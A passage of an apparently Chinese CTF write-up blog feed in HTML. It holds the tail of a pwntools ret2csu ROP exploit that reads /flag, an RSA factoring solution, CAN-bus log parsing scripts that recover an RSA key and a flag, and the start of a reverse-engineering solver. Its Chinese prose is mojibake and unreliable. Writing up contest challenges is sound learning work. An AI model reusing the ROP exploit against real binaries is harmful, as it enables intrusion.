class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    csu2, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, elf.address + <span class="hljs-number">0x4280</span>, <span class="hljs-number">0x30</span>, elf.got[<span class="hljs-string">&#x27;close&#x27;</span>],<br>    csu1<br>]<br><br><br>payload = <span class="hljs-string">b&#x27;&#x27;</span>.join([p64(addr) <span class="hljs-keyword">for</span> addr <span class="hljs-keyword">in</span> rop_chain])<br><br><br>p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendline(offset + payload)<br>p.send(<span class="hljs-string">b&#x27;\x15&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;/flag&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">257</span> - <span class="hljs-number">5</span>))<br>p.send(<span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">1</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="GeneratePrime"><a href="#GeneratePrime" class="headerlink" title="GeneratePrime"></a>GeneratePrime</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>n=<span class="hljs-number">43090231453250894711427929679917165532091051269639380881822679198388872373018031295429558758883298138388596507242928145888959963579111847255588834248367032580980272245414738073179172684104908272069503607376171584936239696444309039211273376010193165083254209608051430794825261116490356392215410064858020176711199543381037420111454942356936721487016187240237683725310306748046587503625096246489043270381153251813360521583717685413070481576320194446237522118380283335294528606720928637529817170809666802598938788405154468683850385277659812316577873886708164549255359514776884765904417881419804464020855420288884972204146588152412816874161445668955639456202226751519881834234916642218078966066353317917939418964763844067220460513388433020071277477619189495465483910271310025371745344364984826481983188861624474015117761898377237745775289039922285111681410319016537270412509750339539020876501534842403407208957382830000761065368861209033791387480377889838737241326116532852335478193204425626487166234964754732945953080086117315162916374952094149599597509405176646068341218684523765974759907645226607364627690026025662221036766148813918691578120023886400197652148214238256715089883892069133754778609710846757189987335827693169644541734443763194942694587436469448973201513131503797898892822373949177030567791519349220158287318717788746060997955057747930375117780320371517616412423571775682868481089431670802944047375824503353609019686495670630728618082254293585479431369645935654024149490741245953271830453426444847467908952699660750809490650479987</span><br>e=<span class="hljs-number">65537</span><br>c=<span class="hljs-number">30862228874892553476569860337345503267926249096036551213683005116620750680365154103242717714230966827288361499342464202425467642950081816675486231250411347472976482409360391136808439034217688010072648722396312121758844966972323513456884732046270240934002095706243044210312663525491282667971502534420245427643076262414036655243117610886157895994101178663474990136516153062956803591842233732498519246731337518545018734984319536536205092573418457928952414660837594265802406473201400259189950484841504227372735345451459452313825309333631615286962304963039625162366186574440146535361888708570569938418676320446653266676364765870547213167058713058609788316647593834008151805692510044158607162858906528913516242904419457446211348504248317409844426309455978985314882123424453618672960876022996245213882467954521212481418830104602302179759479012618982228223244131619557639469872139485197176384683400796204681045965981417650462297978265085323342772310690638049411549216990505001950512428646871875659468885490055363436412364532718888124906227240501145227269727887236864060558999336443165765870556727793253297515155026234234422303238380776900105115890363548589834345888430695886678231459920101695996112312269637459823479947618045447071359886515163416153117176539752947700226596291435270282598638974889205601333097978743387412651687356072223691445472690647184292120882095587563356691450107194982597794937293154289560470269606300576216128045797481404606810315677962659136641943747123985144899464108823536597185386155005111274476874957827391438859327653936</span><br>k = <span class="hljs-number">5</span><br><br>R = Zmod(n)[<span class="hljs-string">&quot;x&quot;</span>]<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    Q = R.quo(R.random_element(k))<br>    pp = gcd(ZZ(<span class="hljs-built_in">list</span>(Q.random_element() ^ n)[<span class="hljs-number">1</span>]), n)<br>    <span class="hljs-keyword">if</span> pp != <span class="hljs-number">1</span>:<br>        qq = <span class="hljs-built_in">sum</span>([pp**i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(k)])<br>        rr = n // (pp * qq)<br>        <span class="hljs-keyword">assert</span> n == pp * qq * rr<br>        <span class="hljs-keyword">break</span><br>phi = (pp - <span class="hljs-number">1</span>) * (qq - <span class="hljs-number">1</span>) * (rr - <span class="hljs-number">1</span>)<br>d = <span class="hljs-built_in">pow</span>(e, -<span class="hljs-number">1</span>, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(m)))<br><br><span class="hljs-comment">#DASCTF&#123;just_a_very_very_easy_task_with_your_talent_is_not&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DASCTFæœˆèµ›</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è½¦è”ç½‘å®‰å…¨é”¦æ ‡èµ›</title>
    <link href="/2023/11/24/2023%E5%85%A8%E5%9B%BD%E6%99%BA%E8%83%BD%E9%A9%BE%E9%A9%B6%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2023/11/24/2023%E5%85%A8%E5%9B%BD%E6%99%BA%E8%83%BD%E9%A9%BE%E9%A9%B6%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h2><p>è½¦è”ç½‘çš„é¢˜ç›®å¤ªå°‘äº†ï¼Œå…¶ä¸­è¿˜æœ‰ä¸€ä¸ªæ˜¯åŸé¢˜ï¼Œå¦ä¸€ä¸ªä¹Ÿåªæ˜¯ç®€å•çš„CANæŠ¥æ–‡åˆ†æï¼ŒæŠ½è±¡è„‘æ´é¢˜ç›®å¤ªå¤šï¼Œå½“ç„¶æœ€åä¸­å›½ç§»åŠ¨æ¯«æ— ç–‘é—®çš„çš„æ‹¿èµ°å† å†›ğŸ˜‚ç®€å•å†™ä¸€ä¸‹å’Œè½¦æœ‰å…³ç³»çš„ä¸¤ä¸ªé¢˜ç›®ï¼Œå¦ä¸€ä¸ªè“ç‰™æµé‡çš„é¢˜ç›®æ”¹å¤©å†™ä¸ªä¸“é¢˜ï¼ˆæŒ–å‘ï¼›å…¶ä»–çš„é¢˜ç›®æ²¡ä»€ä¹ˆå¥½å†™çš„ï¼‰[å†™å®Œäº†ğŸ˜]</p><h2 id="CAN-RSA"><a href="#CAN-RSA" class="headerlink" title="CAN RSA"></a>CAN RSA</h2><p>æ„Ÿè§‰æ¯æ¬¡CANæŠ¥æ–‡çš„å¯†ç é¢˜éƒ½æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ï¼‰éš¾ç»·<br>è§£æ•°æ®åŒ…ï¼Œç›´æ¥æ‹¿#2å¼€å¤´çš„åä¸ƒå­—èŠ‚æ‹¼èµ·æ¥å³å¯ï¼Œå‚è€ƒï¼š<br><a href="https://archives.sector.ca/presentations17/Eric-Evenchick-REAutoDiag.pdf">https://archives.sector.ca/presentations17/Eric-Evenchick-REAutoDiag.pdf</a><br>è§£å‡ºæ¥æ˜¯ä¸€ä¸ªRSAçš„PEMå…¬é’¥ï¼Œä½†åé¢éƒ¨åˆ†è¢«Corruptï¼Œè€Œä¸”ç”¨Crypto.PublicKeyè§£ä¸å‡ºæ¥ï¼Œäºæ˜¯æ‰‹æ’•ä¸€ä¸‹ï¼Œå‚è€ƒï¼š<br><a href="https://tover.xyz/p/pem-by-hand/#RSA%E5%85%AC%E9%92%A5">https://tover.xyz/p/pem-by-hand/#RSA%E5%85%AC%E9%92%A5</a><br>è§£å‡ºæ¥çš„Næ”¾åœ¨factorDBä¸Šå¯ä»¥åˆ†è§£ï¼Œé¡ºä¾¿æœäº†ä¸€ä¸‹å¯ä»¥æ‰¾åˆ°eï¼Œå‚è€ƒï¼š<br><a href="https://github.com/RsaCtfTool/RsaCtfTool/issues/304">https://github.com/RsaCtfTool/RsaCtfTool/issues/304</a><br>æœ€åè§£å¯†å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># https://archives.sector.ca/presentations17/Eric-Evenchick-REAutoDiag.pdf</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./candump.log&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    fr = f.read()<br>data = [x.split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">2</span>].split(<span class="hljs-string">&#x27;#&#x27;</span>)[<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> fr.split(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>]][<span class="hljs-number">10</span>: -<span class="hljs-number">4</span>]<br><span class="hljs-comment">#data = &#x27;&#x27;.join([x[2:].split(&#x27;7D&#x27;)[0] for x in data])</span><br>key = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>    <span class="hljs-comment">#print(i, data[i], bytes.fromhex(data[i][2:]))</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;7D&#x27;</span> <span class="hljs-keyword">in</span> data[i]:<br>        tmp = data[i].split(<span class="hljs-string">&#x27;7D&#x27;</span>)   <span class="hljs-comment"># ????</span><br>        key += tmp[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>:] + <span class="hljs-string">&#x27;4242&#x27;</span> + tmp[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>:]<br>    <span class="hljs-keyword">else</span>:<br>        key += data[i][<span class="hljs-number">2</span>:]<br><br><span class="hljs-keyword">import</span> base64<br>key = <span class="hljs-built_in">bytes</span>.fromhex(key)<br><span class="hljs-comment">#print(key.decode())</span><br><span class="hljs-comment">#print(base64.b64decode(b&#x27;&#x27;.join(key.split(b&#x27;\n&#x27;)[1:-1])).hex())</span><br><br>n = <span class="hljs-number">460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597</span><br><span class="hljs-comment"># factorDB</span><br>p = <span class="hljs-number">15991846970993213322072626901560749932686325766403404864023341810735319249066370916090640926219079368845510444031400322229147771682961132420481897362843199</span><br>q = <span class="hljs-number">28805791771260259486856902729020438686670354441296247148207862836064657849735343618207098163901787287368569768472521344635567334299356760080507454640207003</span><br><span class="hljs-keyword">assert</span> p * q == n<br><br><span class="hljs-comment"># https://github.com/RsaCtfTool/RsaCtfTool/issues/304</span><br>e = <span class="hljs-number">354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</span><br><br>c = <span class="hljs-number">49204714858589959506425439175649050431712689077552080337419353493097408019421214668787900602380476464749282877075822584378756221224722944848685142270406954588911362016685713099949058708493084032575436033859064998703946175169856560687276793237892152502134788316092552043085946089668969326209343517732349235471</span><br><br><span class="hljs-keyword">import</span> libnum<br>d = libnum.invmod(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>flag = libnum.n2s(m)<br><span class="hljs-comment">#print(d)</span><br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment">#b&#x27;fk32mhjlyr9pfamg97999c6b07a8ce82Hds5XEUIqFw8ZR4NLM0lPjtBGT3cDJhmen&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="cané€šä¿¡ä¸‰å­—ç»"><a href="#cané€šä¿¡ä¸‰å­—ç»" class="headerlink" title="cané€šä¿¡ä¸‰å­—ç»"></a>cané€šä¿¡ä¸‰å­—ç»</h2><p>é¦–å…ˆå°†æ‰€æœ‰ç›¸åŒCAN IDçš„æŠ¥æ–‡è¿åœ¨ä¸€èµ·ï¼Œå‘ç°ï¼ŒCAN IDä¸º911çš„æŠ¥æ–‡æœ‰æ‰€éœ€æ•°æ®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…æ•°æ®</span><br>log_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;^\(\d+\.\d+\)\s+can1\s+([\dA-F]&#123;3&#125;)#([0-9A-F]*)$&#x27;</span>)<br><br>can_data = &#123;&#125;<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;candump.log&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file:<br>        line = line.strip()  <span class="hljs-comment"># å»é™¤è¡Œå°¾çš„æ¢è¡Œç¬¦</span><br>        <span class="hljs-keyword">match</span> = log_pattern.<span class="hljs-keyword">match</span>(line)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>            can_id, data = <span class="hljs-keyword">match</span>.groups()<br>            <span class="hljs-comment"># åªåˆå¹¶éå…¨é›¶çš„æ•°æ®å¸§</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">all</span>(c == <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> data):<br>                <span class="hljs-keyword">if</span> can_id <span class="hljs-keyword">in</span> can_data:<br>                    can_data[can_id] += data<br>                <span class="hljs-keyword">else</span>:<br>                    can_data[can_id] = data<br><br><span class="hljs-comment"># ç°åœ¨æ‰“å°è¾“å‡º</span><br><span class="hljs-keyword">for</span> can_id <span class="hljs-keyword">in</span> <span class="hljs-built_in">sorted</span>(can_data.keys()):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;CAN ID <span class="hljs-subst">&#123;can_id&#125;</span>: <span class="hljs-subst">&#123;can_data[can_id]&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>å°†dataåŒº6ä¸ªå­—èŠ‚æå–å‡ºæ¥ï¼Œè½¬æ¢æˆå­—ç¬¦ä¸²å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…å¸¦æœ‰ç‰¹å®šCAN IDå’Œæ•°æ®åç¼€ä¸º03çš„è®°å½•</span><br><span class="hljs-comment"># å‡å®šæ•°æ®è®°å½•æ ¼å¼ä¸ºï¼š&quot;(timestamp) can1 911#03XXXXXX&quot;ï¼Œå…¶ä¸­Xæ˜¯æˆ‘ä»¬éœ€è¦çš„å­—èŠ‚</span><br>log_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\(.*?\)\s+can1\s+911#03([0-9A-F]&#123;6&#125;)&#x27;</span>, re.IGNORECASE)<br><br><span class="hljs-comment"># å­˜å‚¨åŒ¹é…å­—èŠ‚çš„åˆ—è¡¨</span><br>matched_bytes = []<br><br><span class="hljs-comment"># è¯»å–æ–‡ä»¶å†…å®¹</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;candump.log&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file:<br>        <span class="hljs-keyword">match</span> = log_pattern.search(line.strip())<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>            <span class="hljs-comment"># æ·»åŠ åŒ¹é…çš„å­—èŠ‚ï¼ˆåä¸‰ä¸ªå­—èŠ‚æ•°æ®ï¼‰</span><br>            matched_bytes.append(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>))<br><br><span class="hljs-comment"># å°†æ‰€æœ‰åŒ¹é…çš„å­—èŠ‚æ‹¼æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²</span><br>combined_hex = <span class="hljs-string">&#x27;&#x27;</span>.join(matched_bytes)<br><br><span class="hljs-comment"># å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢æˆASCIIæ ¼å¼çš„å­—ç¬¦ä¸²</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hex_to_ascii</span>(<span class="hljs-params">hex_string</span>):<br>    ascii_string = <span class="hljs-built_in">bytearray</span>.fromhex(hex_string).decode()<br>    <span class="hljs-keyword">return</span> ascii_string<br><br>combined_ascii = hex_to_ascii(combined_hex)<br><br><span class="hljs-comment"># è¾“å‡ºåŸå§‹æ‹¼æ¥çš„åå…­è¿›åˆ¶æ•°æ®å’Œå¯¹åº”çš„ASCIIå­—ç¬¦ä¸²</span><br><span class="hljs-comment">#print(f&quot;Combined hex data: &#123;combined_hex&#125;&quot;)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Combined ASCII data: <span class="hljs-subst">&#123;combined_ascii&#125;</span>&quot;</span>)<br><br><span class="hljs-comment">#Combined ASCII data: flag_len:s39f1dll9f4hb6aya9djyig008cb8306703ac96Dar</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è½¦è”ç½‘å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023é¹åŸæ¯åˆèµ›</title>
    <link href="/2023/11/04/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/"/>
    <url>/2023/11/04/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="å®‰å…¨ç¼–ç¨‹"><a href="#å®‰å…¨ç¼–ç¨‹" class="headerlink" title="å®‰å…¨ç¼–ç¨‹"></a>å®‰å…¨ç¼–ç¨‹</h2><p><img src="/mdimg/2023pcb/1.png"><br>ä¿®å¤æ–‡ä»¶å¤´å³å¯</p><h2 id="BabyRe"><a href="#BabyRe" class="headerlink" title="BabyRe"></a>BabyRe</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python">rand = [<span class="hljs-number">19954</span>,<span class="hljs-number">28965</span>,<span class="hljs-number">14137</span>,<span class="hljs-number">3558</span>,<span class="hljs-number">10069</span>,<span class="hljs-number">31251</span>,<span class="hljs-number">32362</span>,<span class="hljs-number">11940</span>,<span class="hljs-number">3430</span>,<span class="hljs-number">27969</span>,<span class="hljs-number">14847</span>,<span class="hljs-number">11465</span>,<span class="hljs-number">12175</span>,<span class="hljs-number">9021</span>,<span class="hljs-number">27614</span>,<span class="hljs-number">8175</span>,<span class="hljs-number">12050</span>,<span class="hljs-number">16408</span>,<span class="hljs-number">20581</span>,<span class="hljs-number">6478</span>,<span class="hljs-number">17749</span>,<span class="hljs-number">4203</span>,<span class="hljs-number">22364</span>,<span class="hljs-number">2272</span>,<span class="hljs-number">9340</span>,<span class="hljs-number">14232</span>,<span class="hljs-number">10535</span>,<span class="hljs-number">32196</span>,<span class="hljs-number">17981</span>,<span class="hljs-number">4946</span>,<span class="hljs-number">3136</span>,<span class="hljs-number">17889</span>,<span class="hljs-number">7408</span>,<span class="hljs-number">30816</span>,<span class="hljs-number">16101</span>,<span class="hljs-number">12491</span>,<span class="hljs-number">23270</span>,<span class="hljs-number">11421</span>,<span class="hljs-number">6414</span>,<span class="hljs-number">31210</span>,<span class="hljs-number">17404</span>,<span class="hljs-number">16964</span>,<span class="hljs-number">2722</span>,<span class="hljs-number">7641</span>,<span class="hljs-number">15728</span>,<span class="hljs-number">14442</span>,<span class="hljs-number">18922</span>,<span class="hljs-number">7948</span>,<span class="hljs-number">4083</span>,<span class="hljs-number">1228</span>,<span class="hljs-number">17990</span>,<span class="hljs-number">32182</span>,<span class="hljs-number">4095</span>,<span class="hljs-number">27339</span>,<span class="hljs-number">13087</span>,<span class="hljs-number">26345</span>,<span class="hljs-number">8298</span>,<span class="hljs-number">17333</span>,<span class="hljs-number">16156</span>,<span class="hljs-number">24319</span>,<span class="hljs-number">17212</span>,<span class="hljs-number">7238</span>,<span class="hljs-number">19353</span>,<span class="hljs-number">27450</span>,<span class="hljs-number">11454</span>,<span class="hljs-number">19311</span>,<span class="hljs-number">14421</span>,<span class="hljs-number">32423</span>,<span class="hljs-number">3283</span>,<span class="hljs-number">26197</span>,<span class="hljs-number">5994</span>,<span class="hljs-number">11848</span>,<span class="hljs-number">651</span>,<span class="hljs-number">13725</span>,<span class="hljs-number">23939</span>,<span class="hljs-number">28785</span>,<span class="hljs-number">28150</span>,<span class="hljs-number">4071</span>,<span class="hljs-number">25161</span>,<span class="hljs-number">27507</span>,<span class="hljs-number">5174</span>,<span class="hljs-number">15768</span>,<span class="hljs-number">17694</span>,<span class="hljs-number">6008</span>,<span class="hljs-number">18904</span>,<span class="hljs-number">18909</span>,<span class="hljs-number">2574</span>,<span class="hljs-number">14254</span>,<span class="hljs-number">5989</span>,<span class="hljs-number">25837</span>,<span class="hljs-number">770</span>,<span class="hljs-number">28328</span>,<span class="hljs-number">3123</span>,<span class="hljs-number">15246</span>,<span class="hljs-number">22839</span>,<span class="hljs-number">29185</span>,<span class="hljs-number">13185</span>,<span class="hljs-number">26586</span>,<span class="hljs-number">19183</span>,<span class="hljs-number">8514</span>,<span class="hljs-number">24515</span>,<span class="hljs-number">24387</span>,<span class="hljs-number">29031</span>,<span class="hljs-number">1029</span>,<span class="hljs-number">16443</span>,<span class="hljs-number">469</span>,<span class="hljs-number">8968</span>,<span class="hljs-number">29531</span>,<span class="hljs-number">29897</span>,<span class="hljs-number">11963</span>,<span class="hljs-number">17889</span>,<span class="hljs-number">29292</span>,<span class="hljs-number">5124</span>,<span class="hljs-number">517</span>,<span class="hljs-number">9813</span>,<span class="hljs-number">31325</span>,<span class="hljs-number">22409</span>,<span class="hljs-number">8104</span>,<span class="hljs-number">9745</span>,<span class="hljs-number">15735</span>,<span class="hljs-number">25236</span>,<span class="hljs-number">12230</span>,<span class="hljs-number">22338</span>,<span class="hljs-number">9605</span>,<span class="hljs-number">22221</span>,<span class="hljs-number">28720</span>,<span class="hljs-number">22532</span>,<span class="hljs-number">4477</span>,<span class="hljs-number">11108</span>,<span class="hljs-number">32554</span>,<span class="hljs-number">541</span>,<span class="hljs-number">5731</span>,<span class="hljs-number">31327</span>,<span class="hljs-number">17262</span>,<span class="hljs-number">17131</span>,<span class="hljs-number">18283</span>,<span class="hljs-number">14387</span>,<span class="hljs-number">5491</span>,<span class="hljs-number">12187</span>,<span class="hljs-number">18782</span>,<span class="hljs-number">2450</span>,<span class="hljs-number">3566</span>,<span class="hljs-number">10652</span>,<span class="hljs-number">13630</span>,<span class="hljs-number">11141</span>,<span class="hljs-number">7578</span>,<span class="hljs-number">10067</span>,<span class="hljs-number">3629</span>,<span class="hljs-number">8634</span>,<span class="hljs-number">21044</span>,<span class="hljs-number">29969</span>,<span class="hljs-number">20107</span>,<span class="hljs-number">7967</span>,<span class="hljs-number">27850</span>,<span class="hljs-number">578</span>,<span class="hljs-number">20575</span>,<span class="hljs-number">23728</span>,<span class="hljs-number">11574</span>,<span class="hljs-number">3815</span>,<span class="hljs-number">5368</span>,<span class="hljs-number">21132</span>,<span class="hljs-number">30438</span>,<span class="hljs-number">19782</span>,<span class="hljs-number">12244</span>,<span class="hljs-number">1871</span>,<span class="hljs-number">13022</span>,<span class="hljs-number">19423</span>,<span class="hljs-number">22720</span>,<span class="hljs-number">27036</span>,<span class="hljs-number">4863</span>,<span class="hljs-number">15267</span>,<span class="hljs-number">26945</span>,<span class="hljs-number">26617</span>,<span class="hljs-number">6793</span>,<span class="hljs-number">26209</span>,<span class="hljs-number">18739</span>,<span class="hljs-number">15072</span>,<span class="hljs-number">4063</span>,<span class="hljs-number">27009</span>,<span class="hljs-number">3760</span>,<span class="hljs-number">5394</span>,<span class="hljs-number">15242</span>,<span class="hljs-number">2292</span>,<span class="hljs-number">21811</span>,<span class="hljs-number">11823</span>,<span class="hljs-number">6273</span>,<span class="hljs-number">11883</span>,<span class="hljs-number">4093</span>,<span class="hljs-number">23428</span>,<span class="hljs-number">22951</span>,<span class="hljs-number">26823</span>,<span class="hljs-number">23480</span>]<br>msg = [<span class="hljs-number">72</span>,  <span class="hljs-number">77</span>,  <span class="hljs-number">59</span>, <span class="hljs-number">160</span>,  <span class="hljs-number">39</span>,  <span class="hljs-number">49</span>,  <span class="hljs-number">40</span>,  <span class="hljs-number">84</span>, <span class="hljs-number">109</span>, <span class="hljs-number">241</span>,<br>   <span class="hljs-number">33</span>,  <span class="hljs-number">53</span>,  <span class="hljs-number">24</span>, <span class="hljs-number">115</span>, <span class="hljs-number">106</span>,  <span class="hljs-number">76</span>, <span class="hljs-number">113</span>,  <span class="hljs-number">59</span>, <span class="hljs-number">189</span>, <span class="hljs-number">152</span>,<br>  <span class="hljs-number">182</span>,  <span class="hljs-number">90</span>, <span class="hljs-number">119</span>,  <span class="hljs-number">45</span>,  <span class="hljs-number">11</span>,  <span class="hljs-number">43</span>, <span class="hljs-number">203</span>, <span class="hljs-number">155</span>, <span class="hljs-number">228</span>, <span class="hljs-number">138</span>,<br>   <span class="hljs-number">76</span>, <span 